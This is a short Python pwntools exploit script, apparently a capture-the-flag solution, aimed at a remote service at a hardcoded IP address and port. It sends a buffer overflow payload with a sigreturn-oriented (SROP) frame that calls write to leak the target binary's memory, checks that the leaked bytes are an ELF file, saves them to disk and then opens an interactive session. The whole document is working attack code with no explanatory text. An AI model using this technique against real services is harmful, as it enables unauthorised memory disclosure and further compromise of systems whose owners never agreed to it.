from pwn import *

context.log_level = "debug"
context.update(arch="amd64", os="linux")
p = remote("123.59.196.133", 10062)
frame_write = SigreturnFrame()
frame_write.rax = 1
frame_write.rdi = 1  # socket
frame_write.rsi = 0x400000  # buffer
frame_write.rdx = 0x1000  # length
frame_write.rip = 0x4000C7 #syscall
p.recvuntil('hacker, TNT!\n')
payload = b"a"*16 +p64(0x4000ee)+p64(0x4000ec) +bytes(frame_write)
p.send(payload)
sleep(2)
p.send('a'*15)
sleep(0.1)
rmc=p.recv()
assert rmc.startswith(b"\x7fELF")
with open("tnt", "wb") as f:
    f.write(rmc)




pause()

p.interactive()
